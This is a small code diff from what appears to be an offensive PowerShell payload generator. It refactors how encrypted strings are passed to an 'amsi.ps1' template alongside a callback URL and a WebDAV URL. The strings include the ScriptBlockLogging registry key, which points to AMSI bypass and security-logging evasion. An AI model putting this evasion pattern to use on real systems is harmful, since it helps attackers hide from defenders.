@@ -121,14 +121,15 @@ def payload_0():
         "HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging",  # noqa
         "EnableScriptBlockLogging",
     ]
+    encrypted_strings = [b64encode(encrypt(x.encode(), key)).decode() for x
+                         in encrypted_strings]
     context = {
         "modules": modules,
         "callback_url": callback_url,
         "webdav_url": webdav_url,
         "key": key,
+        "strings": encrypted_strings,
     }
-    for i, x in enumerate(encrypted_strings):
-        context["string%d" % i] = b64encode(encrypt(x.encode(), key)).decode()
     result = render_template(
                     "amsi.ps1",
                     **context,
